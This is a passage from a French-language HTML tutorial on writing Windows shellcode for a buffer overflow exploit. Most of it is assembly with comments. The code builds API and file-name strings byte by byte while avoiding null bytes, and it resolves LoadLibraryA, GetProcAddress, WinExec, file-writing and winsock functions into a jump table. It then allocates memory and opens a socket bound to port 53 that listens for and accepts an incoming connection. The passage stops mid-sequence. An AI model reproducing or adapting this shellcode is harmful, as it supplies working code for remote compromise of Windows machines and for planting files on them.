+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Bh ;k</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],62h ;b</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],69h ;i</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],64h ;d</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],69h ;i</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],61h ;a</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],70h ;p</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],76h ;v</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Bh ;k</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],2Eh ;.</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],78h ;x</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">En fait, j'ai pris 
+  ebx plut&ocirc;t que eax car l'instruction "inc eax" contient un caract&egrave;re 
+  ill&eacute;gal pour notre buffer. De m&ecirc;me je me suis emb&eacute;t&eacute; 
+  &agrave; faire un "inc ebx" &agrave; chaque fois, car si je bidouillait avec 
+  les adresses ou que je mettais mov byte ptr[ebx+...], ... <br>
+  Et bien au bout d'un moment il y avait des 0000000 &ccedil;a n'allait donc pas. 
+  Je dis &ccedil;a pour pas avoir de commentaires du style : "Pourquoi tu t'es 
+  emb&eacute;t&eacute; &agrave; faire 10000 inc ebx ?" Comme &ccedil;a, &ccedil;a 
+  fonctionne. <br>
+  De plus notre buffer est assez grand (4093 chars :)) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Ensuite, on va 
+  charger les adresses des fonctions pour nous constituer une jump table bien 
+  sympathique :) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 00CE1528h </font><font color="#00CC00">; on push offset de "Kernel32.dll\0"</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;not eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; les not, c pour &eacute;limin&eacute; le 00 encore 
+  une fois</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; Seul param&egrave;tre de LoadlibraryA, l'adresse 
+  de la cha&icirc;ne "kernel32.dll"</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,100E7710h&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; offset 
+  de l'offset de LoadLibraryA (dans la DLL)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [eax]&nbsp; </font><font color="#00CC00">; 
+  Appelle LoadLibraryA</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov edx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; Sauve le handle de KERNEL32 dans edx</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;push 
+  edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; on push edx pour pouvoir r&eacute;utiliser le 
+  Handle pour chaque fonction</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;<font color="#33CCFF">mov 
+  eax,not 00CE1535h </font><font color="#00CC00">; on push l'offset de "GlobalAlloc\0"</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp; 
+  ; Dernier Param&egrave;tre de GetProcAddress</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; on push le handle de KERNEL32 (re&ccedil;u par LoadLibraryA)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov ebx,100E770Ch&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; Adresse de l'adresse de GetProcAddress (Dans la DLL)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebx]&nbsp;</font><font color="#00CC00"> 
+  ; call GetProcAddress</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov dword ptr [ebp+4],eax </font><font color="#00CC00">; 
+  On met l'addresse de GlobalAlloc &agrave; [ebp+4]</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;pop 
+  edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; 
+  r&eacute;cup&egrave;re et sauve le handle de Kernel32.dll</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push edx</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 00CE1541h&nbsp; </font><font color="#00CC00">; TerminateProcess, idem</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push edx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov ebx,100E770Ch</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebx]</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov dword ptr [ebp+8],eax</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;pop 
+  edx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push edx</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Et on r&eacute;p&egrave;te 
+  &ccedil;a pour toutes les fonctions.....Inlassablement.....Pour les fonctions 
+  de winsock aussi.....et.... <br>
+  Voila. Un petit &eacute;claircissement sur ce qu'on a. On a les adresses des 
+  adresses de toutes nos fonctions apr&egrave;s ebp <br>
+  On sait que la pile est sous ebp, donc pas de probl&egrave;me si on a des donn&eacute;es 
+  vitales apr&egrave;s ebp, &ccedil;a risque de tout casser apr&egrave;s l'execution 
+  de notre code, c'est tout, et en s'en fout de &ccedil;a :)) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On a donc sauv&eacute;es 
+  ce que retourne GetProcAddress apr&egrave;s ebp, on a donc ce petit tableau 
+  sympathique : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp; 
+  Fonction&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  Adrresse ou l'appeller</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp; 
+  GlobalAlloc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+4</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; TerminateProcess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+8</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; GetCurrentProcess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+12</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; WinExec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+16</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; _lcreat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+20</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; _lwrite&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+24</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; _lclose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+28</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; socket&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+56 *voir apr&egrave;s</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+36</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; listen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+40</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; accept&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+44</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; recv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+48</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; closocket&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP+52</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">L'adresse pour 
+  socket n'est pas 32 car c'est &eacute;gal &agrave; 20 en hexad&eacute;cimal, 
+  ce qui correspond &agrave; un espace, le serveur ne l'accepte donc pas.On pourra 
+  appeller WinExec par exemple, en faisant&nbsp;<tt><font color="#FF0000"> </font><font color="#FF99FF">call 
+  dword ptr [ebp+16]</font><font color="#FFFFFF">.</font></tt> <br>
+  <font color="#FFFFFF">Ce qui est parfait ! Il ne reste plus que le plus facile. 
+  L'exploit lui-m&ecirc;me, maintenant qu'on a contourn&eacute; la difficult&eacute;s 
+  des shellcodes windows.</font></font> 
+<p><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif" size="2">On 
+  va allouer de la m&eacute;moire pour y mettre des donn&eacute;es telles que 
+  les socket file descriptors, ou la structure sockaddr_in.</font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; 32 bytes &agrave; allouer</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; push le dernier argument, nb de bytes</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not GPTR</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push GPTR, le premier arguments</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+4] </font><font color="#00CC00">; 
+  Call GlobalAlloc</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov esi,not 32</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not esi</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;add esi,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; on a de la m&eacute;moire allou&eacute;e de [esi-32] 
+  &agrave; [esi]</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; pour mettre ce qu'on veut</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor eax,eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov ax,not AF_INET</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not ax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-16],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; on met AF_INET dans sockaddr_in.sinfamily</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;mov ax,not 3500h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; port 53 en netword byte order</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; car : 53 = 0035h = 3500h en network byte order</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-14],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; on met le port dans sinport</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not IPPROTO_TCP</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; dernier argument</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not SOCK_STREAM</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; second argument</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not AF_INET</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; premier argument</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+56]&nbsp;</font><font color="#00CC00"> 
+  ; socket</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-20],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; sauve le socket fd dans [esi-20]</font></tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp;&nbsp; 
+  ; taille de la structure</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push le second argument</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,esi</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;sub eax,16</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; push le premier argument</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-20]</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+36]&nbsp; </font><font color="#00CC00">; 
+  bind(sock,&amp;sin,taille_sin)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 1</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push 1</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-20]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push le socket fd serveur</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+40]&nbsp; </font><font color="#00CC00">; 
+  listen(sock,1)</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;xor 
+  ebx,ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp; 
+  ; push NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-20]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; push sockfd</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+44] </font><font color="#00CC00">; 
+  "accept"&nbsp;&nbsp; accept(sock,NULL,NULL)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-24],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp; 
+  ; sauve le handle du socket client accept&eacute; dans [esi-24]</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;xor 
+  ebx,ebx</font></tt> <br>
